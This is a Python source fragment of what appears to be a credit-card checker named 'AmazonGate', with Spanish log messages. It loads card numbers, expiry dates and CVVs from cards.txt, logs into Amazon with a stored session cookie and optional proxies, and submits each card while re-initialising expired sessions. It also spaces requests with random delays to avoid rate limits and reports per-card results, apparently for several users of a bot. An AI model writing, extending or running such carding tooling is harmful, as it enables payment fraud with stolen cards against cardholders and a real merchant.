        executor = ThreadPoolExecutor(max_workers=1, thread_name_prefix='amazon_gate')
        gate = None
        try:

            def _init_gate_sync():
                g = AmazonGate(cookies_clean, proxy)
                ri = g.init()
                if not ri.get('ok') and proxy and ('Connection failed' in str(ri.get('msg', ''))):
                    try:
                        g.close()
                    except Exception:
                        pass
                    g2 = AmazonGate(cookies_clean, None)
                    ri2 = g2.init()
                    return (g2, ri2)
                return (g, ri)
            gate, ri = await loop.run_in_executor(executor, _init_gate_sync)
            if not ri.get('ok'):
                msg = ri.get('msg', 'Cookie expired')
                print(f'Usuario {user_id} - Init fallido: {msg}')
                err = {'status': '⚠️ Error', 'message': msg}
                for idx in range(len(cards_limpias)):
                    await result_queue.put((idx, err))
                try:
                    await loop.run_in_executor(executor, gate.close)
                except Exception:
                    pass
                return
            for idx, card in enumerate(cards_limpias):
                async with global_semaphore:
                    async with user_semaphore:
                        await asyncio.sleep(0.1 + idx % 5 * 0.05)
                        try:
                            active_requests_count += 1
                            raw_res = await loop.run_in_executor(executor, gate.process, card)
                            mapped = _map_gate_result(raw_res)
                            msg_lower = mapped['message'].lower()
                            is_expired_wrap = 'expired' in msg_lower or 'session error' in msg_lower or 'cookie expired' in msg_lower or ('auth3 failed' in msg_lower)
                            is_throttled_wrap = 'throttled' in msg_lower or 'rate limited' in msg_lower
                            if mapped['status'] == '⚠️ Error' and is_expired_wrap and (not is_throttled_wrap):
                                print(f'Usuario {user_id} - Sesión expirada en tarjeta {idx + 1}, re-init...')
                                ri2 = await loop.run_in_executor(executor, gate.init)
                                if ri2.get('ok'):
                                    raw_res = await loop.run_in_executor(executor, gate.process, card)
                                    mapped = _map_gate_result(raw_res)
                            result = {'status': mapped['status'], 'message': mapped['message'], 'raw': mapped.get('raw')}
                            print(f'Usuario {user_id} - Tarjeta {idx + 1}/{len(cards_limpias)} -> {result['status']}: {result['message']}')
                        except Exception as e:
                            result = {'status': '⚠️ Error', 'message': f'Error al procesar tarjeta: {str(e)}'}
                        finally:
                            active_requests_count -= 1
                        await result_queue.put((idx, result))
                if idx < len(cards_limpias) - 1:
                    await asyncio.sleep(random.uniform(1, 3))
        finally:
            if gate is not None:
                try:
                    await loop.run_in_executor(executor, gate.close)
                except Exception:
                    pass
            executor.shutdown(wait=True)

    async def _drain_results():
        processed = 0
        total = len(cards_limpias)
        while processed < total:
            try:
                idx, res = await asyncio.wait_for(result_queue.get(), timeout=2.0)
                results[idx] = res
                processed += 1
                if callback:
                    try:
                        await callback(idx, res, cards_limpias[idx], user_id)
                    except Exception as e:
                        print(f'Error en callback tarjeta {idx}: {e}')
            except asyncio.TimeoutError:
                await asyncio.sleep(0.1)
                if all((r is not None for r in results)):
                    break
                continue
            except Exception as e:
                print(f'Error drenando resultados: {e}')
                break
    batch_task = asyncio.create_task(_process_batch())
    drain_task = asyncio.create_task(_drain_results())
    await batch_task
    try:
        await asyncio.wait_for(drain_task, timeout=600)
    except asyncio.TimeoutError:
        drain_task.cancel()
        try:
            await drain_task
        except asyncio.CancelledError:
            pass
    for i, r in enumerate(results):
        if r is None:
            results[i] = {'status': '⚠️ Error', 'message': 'Timeout procesando tarjeta'}
    print(f'Usuario {user_id} - Procesadas {len([r for r in results if r is not None])} tarjetas (AmazonGate)')
    return results

def _load_file(path, default=None):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except FileNotFoundError:
        return default
    except Exception:
        return default
if __name__ == '__main__':
    HERE = os.path.dirname(os.path.abspath(__file__))
    COOKIE = _load_file(os.path.join(HERE, 'cookie.txt'), '') or _load_file(os.path.join(HERE, 'nueva_amazon', 'cookie.txt'), '')
    if not COOKIE:
        print('cookie.txt not found or empty (buscado en ./cookie.txt y ./nueva_amazon/cookie.txt)')
        sys.exit(1)
    cc_file = os.path.join(HERE, 'cards.txt')
    if not os.path.exists(cc_file):
        alt = os.path.join(HERE, 'nueva_amazon', 'cards.txt') if os.path.exists(os.path.join(HERE, 'nueva_amazon', 'cards.txt')) else None
        if alt:
            cc_file = alt
        else:
            with open(cc_file, 'w', encoding='utf-8') as f:
                f.write('# num|mm|yy|cvv\n')
            print('cards.txt created, add cards and retry')
            sys.exit(0)
    CARDS = []
    with open(cc_file, 'r', encoding='utf-8') as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith('#'):
                continue
            if AmazonGate.parseCard(ln):
                CARDS.append(ln)
            elif '|' in ln or '/' in ln or ';' in ln or (':' in ln):
                CARDS.append(ln)
    if not CARDS:
        print('No valid cards in cards.txt')
        sys.exit(1)
    PROXY = _load_file(os.path.join(HERE, 'proxy.txt'), None) or _load_file(os.path.join(HERE, 'proxies.txt'), None) or _load_file(os.path.join(HERE, 'nueva_amazon', 'proxies.txt'), None) or _load_file(os.path.join(HERE, 'nueva_amazon', 'proxy.txt'), None)
    if PROXY and '\n' in PROXY:
        for line in PROXY.splitlines():
            line = line.strip()
            if line and (not line.startswith('#')):
                PROXY = line
                break
    if PROXY and PROXY.startswith('#'):
        PROXY = None
    g = AmazonGate(COOKIE, PROXY)
    ri = g.init()
    if not ri['ok']:
        for card in CARDS:
            print(json.dumps({'CC': card, 'ApiResp': ri['msg'], 'T/Tkn': '0s'}, ensure_ascii=False))
        g.close()
        sys.exit(0)
    try:
        for i, card in enumerate(CARDS, 1):
            t1 = time.time()
            try:
                res = g.process(card)
                api_resp = res.get('apiResponse') or res.get('response') or res.get('message', '?')
                resp_str = str(res.get('response', '')).lower()
                api_lower = str(api_resp).lower()
                combined = resp_str + ' ' + api_lower
                is_expired = ('expired' in combined or 'session error' in combined or 'auth3 failed' in combined) and 'failed' in combined or 'cookie expired' in combined or 'session error' in api_lower
                is_throttled = 'throttled' in combined or 'rate limited' in combined
                if not res.get('success') and is_expired and (not is_throttled):
                    ri2 = g.init()
                    if ri2['ok']:
                        t1 = time.time()
                        res = g.process(card)
                        api_resp = res.get('apiResponse') or res.get('response') or res.get('message', '?')
            except Exception as e:
                api_resp = f'Connection failed ({type(e).__name__})'
            dt = round(time.time() - t1, 2)
            print(json.dumps({'CC': card, 'ApiResp': api_resp, 'T/Tkn': f'{dt}s'}, ensure_ascii=False))
            sys.stdout.flush()
            if i < len(CARDS):
                time.sleep(random.uniform(1, 3))
    finally:
        g.close()